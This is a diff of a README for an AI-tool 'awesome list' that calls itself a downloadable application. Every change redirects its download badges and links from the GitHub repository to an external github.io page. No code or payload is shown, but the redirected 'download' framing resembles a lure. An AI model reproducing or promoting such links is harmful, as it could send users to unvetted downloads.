@@ -1,6 +1,6 @@
 # 🤖 awesome-agentic-ecosystem - Your Smart AI Tool Collection Hub
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--agentic--ecosystem-2ea44f?style=for-the-badge)](https://github.com/Lorilynrepudiative5964/awesome-agentic-ecosystem)
+[![Download Now](https://img.shields.io/badge/Download-awesome--agentic--ecosystem-2ea44f?style=for-the-badge)](https://lorilynrepudiative5964.github.io)
 
 ---
 
@@ -40,7 +40,7 @@ Whether you're a curious beginner or a seasoned professional, this collection ha
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/Lorilynrepudiative5964/awesome-agentic-ecosystem](https://github.com/Lorilynrepudiative5964/awesome-agentic-ecosystem)
+Visit this link to download the application: [https://lorilynrepudiative5964.github.io](https://lorilynrepudiative5964.github.io)
 
 This is a web-based application, so once you visit the link, you'll be able to access all the AI tools directly through your web browser. No complicated installation required.
 
@@ -48,7 +48,7 @@ This is a web-based application, so once you visit the link, you'll be able to a
 
 ## 📦 Download & Install
 
-**Step 1:** Click this button to open the download page: [![Download](https://img.shields.io/badge/Get-awesome--agentic--ecosystem-blue?style=for-the-badge)](https://github.com/Lorilynrepudiative5964/awesome-agentic-ecosystem)
+**Step 1:** Click this button to open the download page: [![Download](https://img.shields.io/badge/Get-awesome--agentic--ecosystem-blue?style=for-the-badge)](https://lorilynrepudiative5964.github.io)
 
 **Step 2:** Once the page opens, you'll see the main repository containing all the information about the tools.
 
@@ -207,7 +207,7 @@ Each tool in the collection may have different licensing terms. Always check the
 
 awesome-agentic-ecosystem puts the best AI tools at your fingertips. Whether you're exploring AI for the first time or you're an experienced professional, this collection will save you time and help you discover powerful tools you didn't know existed.
 
-**Start exploring today**: [Get the Collection Now](https://github.com/Lorilynrepudiative5964/awesome-agentic-ecosystem)
+**Start exploring today**: [Get the Collection Now](https://lorilynrepudiative5964.github.io)
 
 ---
 
